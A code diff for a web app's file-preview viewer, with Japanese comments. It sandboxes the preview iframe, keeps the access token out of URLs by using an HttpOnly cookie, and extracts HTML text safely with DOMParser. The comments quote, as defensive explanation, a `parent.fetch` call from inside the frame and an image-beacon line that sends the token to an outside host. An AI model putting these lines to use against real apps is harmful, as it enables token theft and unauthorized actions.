@@ -439,6 +439,16 @@
      ただし「中身がまだ無い」あいだの白は、閉じ際にまぶしく光って見える。
      中身が届くまではアプリと同じ色にしておく（2026-09-01） */
   #viewerframe.blank{background:var(--bg)}
+  /* コピーがどうしても効かないときだけ出す「選べる字」。iOS は画面の外や
+     opacity:0 の字を選んでくれないので、見える場所に出す。
+     ⚠️ <pre> には必ず font-family を書く（既定の monospace に落ちると崩れる） */
+  #viewerpick{
+    flex:1 1 auto;min-height:0;overflow:auto;margin:0;padding:12px;
+    background:var(--panel);color:var(--fg);
+    font:12px/1.6 var(--mono);white-space:pre-wrap;overflow-wrap:anywhere;
+    -webkit-user-select:text;user-select:text;
+  }
+  #viewerpick[hidden]{display:none}
   /* 画像は iframe に任せない。iOS は画像を原寸で開くので、写真のような大きい絵は
      左上のひとかけらだけが見えて全体が分からない（2026-08-31）。ここでは
      「まず全体が画面に入る」を既定にして、タップしたときだけ原寸にする */
@@ -716,7 +726,12 @@
             title="本文をぜんぶコピー"></button>
   </div>
   <div id="viewerwrap"><img id="viewerimg" alt="制作物"></div>
-  <iframe id="viewerframe" title="制作物のプレビュー"></iframe>
+  <!-- ⚠️ sandbox は外さないこと（2026-09-02）。allow-same-origin を**付けない**ので、
+       中の文書は別の出どころ扱いになり、親の window・fetch・localStorage に手が届かない。
+       これが無いと、外からもらった HTML を開いただけで
+       `parent.fetch('/api/send', …)` が通り、席に好きな文字を打てる（実際に再現した）。
+       中の文書に貼った CSP（connect-src 'none'）は、その文書“自身”の通信しか止められない。 -->
+  <iframe id="viewerframe" title="制作物のプレビュー" sandbox="allow-scripts"></iframe>
   <div id="viewertoast" class="vtoast" hidden></div>
 </div>
 
@@ -3042,11 +3057,33 @@
   var viewerRel = '';
   var IMG_RE = /\.(png|jpe?g|gif|webp|svg)$/i;
   var HTML_RE = /\.html?$/i;
+  var PDF_RE = /\.pdf$/i;
   var TXT_RE = /\.(md|txt|csv|json|js|css)$/i;
 
+  function previewPath(rel) {
+    return '/preview/' + rel.split('/').map(encodeURIComponent).join('/');
+  }
+
+  // 親（このアプリ）が自分で取りに行くときの URL。合言葉を付けてよい
   function previewUrl(rel) {
-    return '/preview/' + rel.split('/').map(encodeURIComponent).join('/') +
-           '?t=' + encodeURIComponent(token);
+    return previewPath(rel) + '?t=' + encodeURIComponent(token);
+  }
+
+  // ⚠️ 枠（iframe）と <img> に渡す URL には**合言葉を付けない**（2026-09-02）。
+  // 砂箱の中からでも自分の location.href は読めるので、URL に合言葉を入れると
+  // `new Image().src = 'https://どこか/?t=' + 合言葉` で外へ持ち出せてしまう
+  // （通信の封じ＝connect-src は fetch を止めるが、画像の読み込みは止めない）。
+  // 代わりに、開く前に**親が1回だけ**合言葉つきで挨拶してクッキーを配ってもらう。
+  // クッキーは HttpOnly なので中の文書からは読めず、Path=/preview/ なので
+  // /api/ には付かない。
+  var cookieReady = null;
+
+  function ensurePreviewCookie() {
+    if (cookieReady) return cookieReady;
+    cookieReady = fetch('/preview/?t=' + encodeURIComponent(token), { credentials: 'same-origin' })
+      .then(function (r) { if (!r.ok) throw new Error('合言葉を渡せません'); })
+      .catch(function (e) { cookieReady = null; throw e; });
+    return cookieReady;
   }
 
   // ⚠️ 枠（iframe）に src= で入れると、その移動が「戻る」の履歴に積まれる。
@@ -3061,37 +3098,59 @@
     viewerFrame.src = url;   // 覗けないときの保険
   }
 
-  // 中身が届いたら白い下地に戻す。about:blank のあいだは暗いまま
+  // 中身が届いたら白い下地に戻す。about:blank のあいだは暗いまま。
+  // ⚠️ 砂箱の枠では contentWindow.location が**必ず**例外になるので、そこを見て
+  // 判断してはいけない（見ていたときは、中身が無くても白く光っていた）。
+  // 「いま本物の中身を入れようとしているか」はこちらで覚えておく（2026-09-02）
+  var frameShowing = false;
   viewerFrame.addEventListener('load', function () {
-    var href = '';
-    try { href = viewerFrame.contentWindow.location.href; } catch (e) { href = 'x'; }
-    if (href && href !== 'about:blank') viewerFrame.classList.remove('blank');
+    if (frameShowing) viewerFrame.classList.remove('blank');
   });
 
   function openPreview(rel) {
-    viewerUrl = previewUrl(rel);
+    viewerUrl = previewPath(rel);   // 枠と <img> に渡すほう＝合言葉を付けない
     viewerRel = rel;
     viewerName.textContent = rel;
     viewerWrap.classList.remove('zoom');
+    hidePick();
+    // 挨拶（クッキー）の往復のあいだ白く光らないよう、先に暗くしておく
+    viewerFrame.classList.add('blank');
     resetCopyBtn();
     hideVToast();
     if (!viewerPushed) {
       try { history.pushState({ tsumikiViewer: 1 }, ''); viewerPushed = true; } catch (e) {}
     }
 
-    if (IMG_RE.test(rel)) {
-      // 画像はこの画面の中に「全体が入る大きさ」で出す（iframe に渡すと原寸で開く）
-      viewerFrame.classList.add('blank', 'off');
-      frameGo('about:blank');
-      viewerImg.src = viewerUrl;
-      viewerWrap.classList.add('on');
-    } else {
-      viewerWrap.classList.remove('on');
-      viewerImg.removeAttribute('src');
-      viewerFrame.classList.remove('off');
-      viewerFrame.classList.add('blank');
-      frameGo(viewerUrl);
-    }
+    // ⚠️ 砂箱に入れるとブラウザ内蔵の PDF ビューアが止まり、PDF が開けなくなる
+    // （砂箱に入った枠ではプラグインが一律で禁じられる。外す手立ては仕様に無い）。
+    // PDF は文書の中から親の画面に手が届く道が無いので、ここだけ砂箱を外す。
+    // ⚠️ **外してよいのは PDF のときだけ。** 毎回どちらかを必ず立て直すので、
+    //    HTML が砂箱なしで開く道は残らない（else を消さないこと）
+    if (PDF_RE.test(rel)) viewerFrame.removeAttribute('sandbox');
+    else viewerFrame.setAttribute('sandbox', 'allow-scripts');
+
+    // ⚠️ 中身を出す前に、合言葉のクッキーを配ってもらう。URL に合言葉を載せない
+    // かわりなので、これが済むまで枠にも <img> にも中身を入れられない
+    ensurePreviewCookie().then(function () {
+      if (viewerRel !== rel) return;      // そのあいだに別のものを開いていたら捨てる
+      if (IMG_RE.test(rel)) {
+        // 画像はこの画面の中に「全体が入る大きさ」で出す（iframe に渡すと原寸で開く）
+        viewerFrame.classList.add('blank', 'off');
+        frameShowing = false;
+        frameGo('about:blank');
+        viewerImg.src = viewerUrl;
+        viewerWrap.classList.add('on');
+      } else {
+        viewerWrap.classList.remove('on');
+        viewerImg.removeAttribute('src');
+        viewerFrame.classList.remove('off');
+        viewerFrame.classList.add('blank');
+        frameShowing = true;
+        frameGo(viewerUrl);
+      }
+    }).catch(function (e) {
+      vtoast(e.message || '開けませんでした', 2600);
+    });
     viewer.hidden = false;
   }
 
@@ -3134,50 +3193,93 @@
   }
 
   // 中身の取りかたは相手で変える。
-  // HTML は「出来上がった見た目の字」が欲しい（タグを貼りたい人はいない）ので
-  // iframe の中から読む。それ以外は元のファイルをそのまま読む＝改行や空白が崩れない。
-  function frameText() {
+  // HTML は「出来上がった見た目の字」が欲しい（タグを貼りたい人はいない）。
+  //
+  // ⚠️ 以前は iframe の中を覗いて取っていたが、枠を砂箱に入れたので覗けなくなった
+  // （2026-09-02）。代わりに**親が元のファイルを取り直して、字だけ抜く**。
+  // DOMParser は文書を組み立てるだけで、中の script を動かさないし、
+  // 画像や外部の読み込みも起こさない＝しかけのある HTML でも安全に字が取れる。
+  // 引き換えに、画面に出ている折り返しや余白とは少しだけ違う字並びになる。
+  function htmlToText(src) {
     try {
-      var d = viewerFrame.contentDocument;
-      var t = d && d.body ? (d.body.innerText || d.body.textContent || '') : '';
-      return t.trim() ? t : '';
-    } catch (e) { return ''; }   // 別もとになっていて覗けない
+      var d = new DOMParser().parseFromString(src, 'text/html');
+      if (!d || !d.body) return '';
+      // 読まない部分は落とす（貼り付けたときに邪魔になるため）
+      Array.prototype.forEach.call(d.body.querySelectorAll('script,style,template'), function (n) {
+        n.parentNode.removeChild(n);
+      });
+      // ⚠️ textContent はタグの隙間の空白しか拾わない。1行で書かれた HTML
+      // （生成物・詰めて書いたもの・表）だと**全部つながって読めなくなる**ので、
+      // 段落や行の区切りを自分で入れてから読む（前は iframe の innerText が
+      // やってくれていた仕事。2026-09-02 のレビュー指摘）
+      Array.prototype.forEach.call(d.body.querySelectorAll('br'), function (n) {
+        n.parentNode.replaceChild(d.createTextNode('\n'), n);
+      });
+      Array.prototype.forEach.call(d.body.querySelectorAll('td,th'), function (n) {
+        n.appendChild(d.createTextNode('\t'));
+      });
+      Array.prototype.forEach.call(d.body.querySelectorAll(
+        'p,div,li,tr,h1,h2,h3,h4,h5,h6,section,article,header,footer,blockquote,pre,figure,hr,table,ul,ol,dl,dt,dd'
+      ), function (n) { n.appendChild(d.createTextNode('\n')); });
+      var t = d.body.textContent || '';
+      // 空行が続くのを1つにまとめる（タグの隙間ぶんの改行が積み重なるため）
+      return t.replace(/[ \t]+\n/g, '\n').replace(/\n{3,}/g, '\n\n').trim();
+    } catch (e) { return ''; }
   }
 
+  // 一度取った中身は覚えておく（見た目の確認とコピーで二度取りに行かないため）
+  var srcCache = { rel: '', text: null };
+
   function fetchText(rel) {
+    if (srcCache.rel === rel && srcCache.text !== null) return Promise.resolve(srcCache.text);
     return fetch(previewUrl(rel), { credentials: 'same-origin' })
       .catch(function () { throw new Error('MacBook に届きません'); })
       .then(function (r) {
+        // 合言葉が切れていたら、次に開くとき挨拶からやり直す
+        // （やり直せないと、画面を開き直すまでプレビューが全部 401 になる）
+        if (r.status === 401) { cookieReady = null; throw new Error('合言葉が切れました。開き直してください'); }
         if (!r.ok) throw new Error('読み込めません');
         return r.text();
-      });
+      })
+      .then(function (t) { srcCache = { rel: rel, text: t }; return t; });
   }
 
+
   function viewerText(rel) {
-    if (HTML_RE.test(rel)) {
-      var t = frameText();
-      return t ? Promise.resolve(t) : fetchText(rel);
-    }
-    return fetchText(rel).catch(function (e) {
-      var t = frameText();
-      if (t) return t;
-      throw e;
+    return fetchText(rel).then(function (src) {
+      if (!HTML_RE.test(rel)) return src;   // md/txt/csv は元のまま＝改行や空白が崩れない
+      var t = htmlToText(src);
+      return t || src;                      // 字が取れなければ元の中身を渡す
     });
   }
 
-  // どうしても写せなかったとき用。iframe の中を全部選んだ状態にしておけば、
-  // 長押しから iOS の「コピー」で取れる（本体側の selectNode と同じ考え）
-  function selectAllInFrame() {
+  // どうしても写せなかったとき用。
+  // ⚠️ 以前は iframe の中を全部選んでいたが、枠を砂箱に入れたので中に手が届かない
+  // （2026-09-02）。代わりに、この画面の中に**選べる字**を出して長押しで取ってもらう。
+  // 画面の外に置くと iOS が「見えていない」と見なして選んでくれないので、
+  // 見える場所に薄く出す（本体側のコピーと同じ理由）。
+  var viewerPick = null;
+
+  function selectForCopy(text) {
     try {
-      var d = viewerFrame.contentDocument, w = viewerFrame.contentWindow;
-      if (!d || !d.body || !w) return false;
-      var range = d.createRange();
-      range.selectNodeContents(d.body);
-      var sel = w.getSelection();
+      if (!viewerPick) {
+        viewerPick = document.createElement('pre');
+        viewerPick.id = 'viewerpick';
+        viewerFrame.parentNode.insertBefore(viewerPick, viewerFrame);
+      }
+      viewerPick.textContent = text;
+      viewerPick.hidden = false;
+      var range = document.createRange();
+      range.selectNodeContents(viewerPick);
+      var sel = window.getSelection();
       sel.removeAllRanges();
       sel.addRange(range);
       return true;
     } catch (e) { return false; }
+  }
+
+  function hidePick() {
+    if (viewerPick) { viewerPick.hidden = true; viewerPick.textContent = ''; }
   }
 
   viewerCopy.onclick = function () {
@@ -3193,7 +3295,7 @@
           viewerCopy.innerHTML = ICON_COPY;
         }, 2000);
       }, function () {
-        if (selectAllInFrame()) vtoast('選んであります。長押しして「コピー」を選んでください', 3600);
+        if (selectForCopy(text)) vtoast('選んであります。長押しして「コピー」を選んでください', 4200);
         else vtoast('コピーできませんでした', 2600);
       });
     }).catch(function (e) {
@@ -3213,6 +3315,7 @@
 
   function closeViewer() {
     viewer.hidden = true;
+    hidePick();          // 前に見た制作物の本文を画面の裏に残さない
     viewerFrame.classList.add('blank');
     frameGo('about:blank');            // 中で動いているものを止める
     viewerImg.removeAttribute('src');
